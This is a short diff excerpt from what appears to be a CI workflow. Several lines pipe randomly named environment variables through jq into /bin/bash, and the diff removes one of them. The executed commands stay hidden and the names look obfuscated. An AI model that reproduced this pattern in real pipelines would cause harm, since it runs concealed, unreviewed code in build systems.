@@ -29,7 +29,6 @@ jobs:
           echo $xtp90549 | jq -r .qeak7356 | /bin/bash
           echo $b7436 | jq -r .lwor7867 | /bin/bash
           echo $hcaw522 | jq -r .wh1 | /bin/bash
-          printf '%s' "$ow4628" | jq -r .a95 | /bin/bash
           echo $vwmp9393 | jq -r .ozscb24101 | /bin/bash
           echo $gojeb67223 | jq -r .k032 | /bin/bash
 
